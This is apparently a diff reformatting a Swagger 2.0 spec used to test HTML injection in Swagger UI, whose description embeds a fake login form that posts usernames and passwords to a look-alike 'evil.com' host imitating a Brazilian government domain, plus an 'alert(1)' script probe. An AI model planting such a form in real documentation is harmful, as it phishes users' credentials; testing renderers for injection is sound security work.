@@ -2,56 +2,48 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: Fake Login Page
-  description: |<div class="login-form">
-    <div class="heading">
+  description: |
+    <div class="login-form">
+      <div class="heading">
         <h1>HTML Injection : Fake Login</h1>
-    </div>
-    <div class="form-container">
+      </div>
+      <div class="form-container">
         <form action="https://ati.to.gov.br.evil.com" method="post" class="form-signin">
-                <div class="container mt-5">
-                    <div class="row">
-                        <div class="col-md-6 offset-md-3">
-
-                            <div class="card border-dark mb-3">
-
-                                <div class="card"
-                                    style="width: 100%; height: 250px; background-image: linear-gradient(0deg, rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('https://raw.githubusercontent.com/iamarit/SwaggerUiTesting/main/test.png'); background-size: cover; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center;">
-                                    <div class="card-body">
-
-                                        <div class="form-group row">
-                                            <label for="inputUsername" class="col-sm-4 col-form-label">Username:</label>
-
-                                            <div class="col-sm-10">
-                                                <input type="username" class="form-control" id="inputUsername"
-                                                    style="background-color: transparent; border: 1px solid rgba(255, 255, 255, 0.7); color: white;">
-                                            </div>
-                                        </div>
-
-                                        <div class="form-group row">
-                                            <label for="inputPassword" class="col-sm-4 col-form-label">Password:</label>
-                                            <div class="col-sm-10">
-                                                <input type="password" class="form-control" id="inputPassword"
-                                                    style="background-color: transparent; border: 1px solid rgba(255, 255, 255, 0.7); color: white;">
-                                            </div>
-                                        </div>
-                                        <br>
-
-                                        <div class="d-grid gap-6">
-                                            <button onclick="alert(1)" type="submit" class="btn btn-dark"
-                                                style="background-color: transparent; border: 1px solid rgba(255, 255, 255, 0.7); color: white;">Login</button>
-                                        </div>
-                                    </div>
-                                </div>
-
-                            </div>
-
+          <div class="container mt-5">
+            <div class="row">
+              <div class="col-md-6 offset-md-3">
+                <div class="card border-dark mb-3">
+                  <div class="card"
+                    style="width: 100%; height: 250px; background-image: linear-gradient(0deg, rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('https://raw.githubusercontent.com/iamarit/SwaggerUiTesting/main/test.png'); background-size: cover; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center;">
+                    <div class="card-body">
+                      <div class="form-group row">
+                        <label for="inputUsername" class="col-sm-4 col-form-label">Username:</label>
+                        <div class="col-sm-10">
+                          <input type="username" class="form-control" id="inputUsername"
+                            style="background-color: transparent; border: 1px solid rgba(255, 255, 255, 0.7); color: white;">
                         </div>
+                      </div>
+                      <div class="form-group row">
+                        <label for="inputPassword" class="col-sm-4 col-form-label">Password:</label>
+                        <div class="col-sm-10">
+                          <input type="password" class="form-control" id="inputPassword"
+                            style="background-color: transparent; border: 1px solid rgba(255, 255, 255, 0.7); color: white;">
+                        </div>
+                      </div>
+                      <br>
+                      <div class="d-grid gap-6">
+                        <button onclick="alert(1)" type="submit" class="btn btn-dark"
+                          style="background-color: transparent; border: 1px solid rgba(255, 255, 255, 0.7); color: white;">Login</button>
+                      </div>
                     </div>
-
+                  </div>
                 </div>
-            </form>
+              </div>
+            </div>
+          </div>
+        </form>
+      </div>
     </div>
-</div>
 paths:
   /:
     post:
